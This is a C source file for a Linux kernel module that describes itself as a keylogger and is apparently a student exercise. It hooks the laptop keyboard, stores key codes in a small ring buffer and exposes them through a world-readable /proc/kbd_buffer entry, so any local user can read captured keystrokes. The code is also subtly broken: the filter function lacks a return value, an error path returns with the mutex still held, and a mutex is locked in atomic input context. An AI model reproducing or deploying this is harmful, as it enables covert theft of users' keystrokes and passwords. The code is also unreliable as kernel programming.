#include <linux/input.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/mutex.h>
#include <linux/uaccess.h>

MODULE_DESCRIPTION("Keylogger with buffer and procfs interface");
MODULE_AUTHOR("Laurenz Weixlbaumer <k11804751@students.jku.at>");
MODULE_LICENSE("GPL");

#define DEVICE_NAME "AT Translated Set 2 keyboard"
#define BUFFER_SIZE 20
#define PROC_FS_NAME "kbd_buffer"

static struct input_handle handle;
static unsigned char buffer[BUFFER_SIZE];
static int data_count = 0;
static struct mutex buffer_mutex;
static struct proc_dir_entry *proc_entry;

static int write_pos = 0;
static int read_pos = 0;

static int logger_connect(struct input_handler *handler, struct input_dev *dev,
			  const struct input_device_id *id)
{
	int error;

	if (strcasecmp(dev->name, DEVICE_NAME)) {
		return 0;
	}

	printk(KERN_INFO "connect to device \"%s\"\n", dev->name);
	handle.dev = dev;
	handle.handler = handler;
	handle.name = "logger";
	error = input_register_handle(&handle);
	if (error) {
		printk(KERN_ERR "could not register handle\n");
		return error;
	}

	error = input_open_device(&handle);
	if (error) {
		input_unregister_handle(&handle);
		printk(KERN_ERR "could not open handle\n");
		return error;
	}

	return 0;
}

static void logger_disconnect(struct input_handle *handle)
{
	if (handle == NULL) {
		return;
	}

	printk(KERN_INFO "disconnect from device \"%s\"\n", handle->dev->name);
	input_close_device(handle);
	input_unregister_handle(handle);
	handle->dev = NULL;
	handle->handler = NULL;
}

static bool logger_filter(struct input_handle *handle, unsigned int type,
			  unsigned int code, int value)
{
	if (type != EV_KEY || value == 1) {
		return false;
	}

	mutex_lock(&buffer_mutex);
	buffer[write_pos] = (unsigned char)code;
	write_pos = (write_pos + 1) % BUFFER_SIZE;
	if (data_count < BUFFER_SIZE) {
		data_count++;
	} else {
		read_pos = (read_pos + 1) % BUFFER_SIZE;
	}
	mutex_unlock(&buffer_mutex);
}

static ssize_t proc_read(struct file *file, char __user *buffer, size_t count,
			 loff_t *ppos)
{
	if (*ppos > 0) {
		return 0;
	}

	unsigned char temp_buffer[4];
	int bytes_to_read = min(min((int)count, 4), data_count);

	mutex_lock(&buffer_mutex);
	for (int i = 0; i < bytes_to_read; i++) {
		temp_buffer[i] = buffer[read_pos];
		read_pos = (read_pos + 1) % BUFFER_SIZE;
		data_count--;
	}

	if (copy_to_user(buffer, temp_buffer, bytes_to_read)) {
		return -EFAULT;
	}
	mutex_unlock(&buffer_mutex);

	*ppos += bytes_to_read;
	return bytes_to_read;
}

static const struct proc_ops proc_fops = {
	.read = proc_read,
};

static const struct input_device_id relevant_device_ids[] = {
	{
		.flags = INPUT_DEVICE_ID_MATCH_EVBIT,
		.evbit = { BIT_MASK(EV_KEY) },
	},
	{},
};

MODULE_DEVICE_TABLE(input, relevant_device_ids);

static struct input_handler logger_handler = {
	.name = "keylogger-handler",
	.connect = logger_connect,
	.disconnect = logger_disconnect,
	.filter = logger_filter,
	.id_table = relevant_device_ids,
};

static void logger_cleanup(void)
{
	input_unregister_handler(&logger_handler);
	proc_remove(proc_entry);
	mutex_destroy(&buffer_mutex);
	printk(KERN_INFO "keyboard buffer module unloaded\n");
}

static int logger_init(void)
{
	mutex_init(&buffer_mutex);

	// 0444 = read only for all groups
	proc_entry = proc_create(PROC_FS_NAME, 0444, NULL, &proc_fops);
	if (proc_entry == NULL) {
		printk(KERN_ERR "could not create proc entry\n");
		return -ENOMEM;
	}

	int res = input_register_handler(&logger_handler);
	if (res) {
		printk(KERN_ERR "could not register input handler: %d\n", res);
		logger_cleanup();
		return res;
	}

	printk(KERN_INFO "keyboard buffer module loaded successfully\n");
	return 0;
}

module_init(logger_init);
module_exit(logger_cleanup);
